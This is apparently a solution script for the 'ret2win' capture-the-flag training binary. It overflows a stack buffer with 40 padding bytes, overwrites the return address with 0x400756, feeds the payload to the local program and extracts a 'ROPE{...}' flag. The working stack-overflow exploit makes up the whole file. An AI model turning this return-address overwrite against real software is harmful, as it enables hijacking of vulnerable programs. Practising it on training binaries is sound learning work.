import re
import struct
from subprocess import PIPE, Popen

ELF_PATH = "./ret2win"


JUNK = b"A" * 40

# rabin2 -s ./ret2win | grep -P "ret2win$" | awk '{print $3}'
RET2_WIN = struct.pack("<Q", 0x00400756)

payload = b""
payload += JUNK
payload += RET2_WIN


p = Popen(ELF_PATH, stdin=PIPE, stdout=PIPE, stderr=PIPE)
reply = p.communicate(payload)[0].decode()
flag = re.findall(r"ROPE{.+}", reply)[0]
print(flag)
